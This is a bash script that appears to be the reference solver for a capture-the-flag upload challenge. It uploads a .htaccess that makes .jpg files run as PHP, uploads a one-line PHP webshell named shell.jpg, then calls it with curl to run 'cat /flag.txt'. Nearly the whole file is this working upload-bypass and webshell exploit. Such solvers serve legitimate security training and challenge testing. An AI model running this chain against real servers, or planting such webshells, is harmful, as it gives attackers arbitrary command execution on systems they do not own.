#!/usr/bin/env bash
# 06 · upload-htaccess reference solver
# The upload blocks PHP extensions but allows .htaccess and .jpg. Upload a
# .htaccess that makes .jpg run as PHP, then upload a .jpg webshell.
#
# Usage: ./solve.sh http://TARGET:PORT
set -euo pipefail
BASE="${1:?usage: solve.sh http://host:port}"
TMP="$(mktemp -d)"

# 1) .htaccess: re-map .jpg to the PHP handler for this directory.
cat > "${TMP}/.htaccess" <<'EOF'
AddType application/x-httpd-php .jpg
EOF

# 2) a "jpg" that is really a PHP webshell.
cat > "${TMP}/shell.jpg" <<'EOF'
<?php system($_GET["c"]); ?>
EOF

echo "[*] Uploading .htaccess..."
curl -s -F "file=@${TMP}/.htaccess;filename=.htaccess" "${BASE}/" >/dev/null

echo "[*] Uploading shell.jpg..."
curl -s -F "file=@${TMP}/shell.jpg;filename=shell.jpg" "${BASE}/" >/dev/null

echo "[*] Triggering the webshell..."
curl -s -G "${BASE}/uploads/shell.jpg" --data-urlencode "c=cat /flag.txt" \
  | grep -oE 'SecurinetsENIT\{[^}]+\}' | head -n1

rm -rf "${TMP}"
